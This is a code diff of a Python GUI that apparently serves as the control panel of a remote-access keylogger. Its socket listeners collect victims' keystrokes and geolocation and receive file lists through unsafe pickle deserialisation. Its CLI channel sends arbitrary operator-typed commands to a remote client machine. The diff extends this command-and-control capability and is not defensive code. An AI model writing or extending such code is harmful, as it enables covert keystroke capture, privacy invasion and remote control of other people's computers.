@@ -1,12 +1,11 @@
 import customtkinter
 import tkinter
-from pynput.keyboard import Listener
 import threading
 import socket
-import tkinter
 import tkintermapview
 import subprocess
 import time
+import pickle
 
 class App(customtkinter.CTk):
     SERVER_SOCKETS= [] 
@@ -83,11 +82,12 @@ class App(customtkinter.CTk):
         ###########################################################################################
         #                                        System                                           #
         ###########################################################################################
-        #? Socket Functions
+        #? KEYLOGGER SOCKET
         def startSocket():
             t2 = threading.Thread(target=createKeylogSocket)
             t2.daemon = True
             t2.start()
+            print("Server started the keylog socket.")
 
         def createKeylogSocket():
             HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
@@ -97,21 +97,50 @@ class App(customtkinter.CTk):
                 self.SERVER_SOCKETS.append(s)
                 # Continue
                 s.bind((HOST, PORT))
-                print("Listening for clients.")
+                print("KEYLOGGER: Listening for Keylog clients.")
                 s.listen()
                 conn, addr = s.accept()
                 with conn:
-                    print(f"Connected by {addr}")
+                    print(f"KEYLOGGER: Connected by {addr}")
                     # Recieve geo data before key logging
                     self.USER_GEOLOCATIONS.append(conn.recv(24).decode("utf-8"))
                     self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                     while True:
                         data = conn.recv(1024).decode("utf-8") 
                         self.textbox.insert("0.0", f"{data[1:-1]}\n") 
-                        print(data)
+                        #print(data)
         startSocket()
         
-        # CLI socket segment
+        #? FILE_TRANSFER SOCKET
+        def start_file_name_socket():
+            t4 = threading.Thread(target=create_file_name_socket)
+            t4.daemon = True
+            t4.start()
+            print("FILE_TRANSFER: Server started.")
+
+        def create_file_name_socket():
+            HOST = "127.0.0.2"  # Standard loopback interface address (localhost)
+            PORT = 65433  # Port to listen on (non-privileged ports are > 1023)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                # Add the server socket to a list
+                self.SERVER_SOCKETS.append(s)
+                # Continue
+                s.bind((HOST, PORT))
+                print("FILE_TRANSFER: Listening for clients.")
+                s.listen()
+                conn, addr = s.accept()
+                
+                # Accept the pickle list and print it
+                with conn:
+                    print(f"FILE_TRANSFER: Connected by {addr}")
+                    data = conn.recv(1024)
+                    data = pickle.loads(data)
+                    print(data)
+
+                  
+        start_file_name_socket()
+
+        #! CLI SOCKET SEGMENT
         def start_CLI_socket():
             t3 = threading.Thread(target=create_CLI_socket)
             t3.daemon = True
@@ -121,20 +150,21 @@ class App(customtkinter.CTk):
             global cli
             HOST = "192.168.0.103"  # Standard loopback interface address (localhost)
             PORT = 12345  # Port to listen on (non-privileged ports are > 1023)
+
             #? This makes sure that we dont loose connection for too long
             def wake_up():
                 wake_tries = 0
                 time.sleep(10)
                 try:
                     cli.connect((HOST,PORT))
-                    print("Success: Established new CLI connection.")
+                    print("CLI: Success: Established new CLI connection.")
                     wake_tries = 0
                 except Exception as e: print(f"Thrown Exception CLI_Wake_Up: {e}") 
                 
-                # After 10 minutes of no connection kill the socket
+                #? After 10 minutes of no connection kill the socket
                 wake_tries+=1
                 if wake_tries >= 60:
-                    print("Error: Chosen client is offline, terminating socket.")
+                    print("CLI_Error: Chosen client is offline, terminating socket.")
                     cli.close()
 
             # Start  CLI socket
@@ -143,7 +173,7 @@ class App(customtkinter.CTk):
                 try:    
                     cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     cli.connect((HOST,PORT))
-                    print("Success: Connected to CLI client.")
+                    print("CLI_Success: Connected to CLI client.")
                     break
                 except Exception as e: print(f"Thrown Exception CLI: {e}")
                 wake_up()
@@ -155,7 +185,8 @@ class App(customtkinter.CTk):
     def send_to_client(self):
         global cli
         data = self.entry.get()
-        cli.send(b"run -keylogger")
+        cli.send(bytes(f"{data}", "utf-8"))
+        print(f"Sent: {data}, to Client")
             
     def showFiles(self):
         subprocess.Popen('explorer "Data"')         
@@ -165,9 +196,9 @@ class App(customtkinter.CTk):
             for socket in self.SERVER_SOCKETS:
                 socket.shutdown(socket.SHUT_RDWR)
                 socket.close()
-            print("Succsesfully shutdown all connections.")
+            print("KILLSWITCH: Succsesfully shutdown all connections.")
         except:
-            print("Error: Socket shutdown. Prob no sockets to close.")
+            print("KILLSWITCH_Error: Socket shutdown. Prob no sockets to close.")
     
     # TODO show the open ports in the textbox
     def openScanner(self):
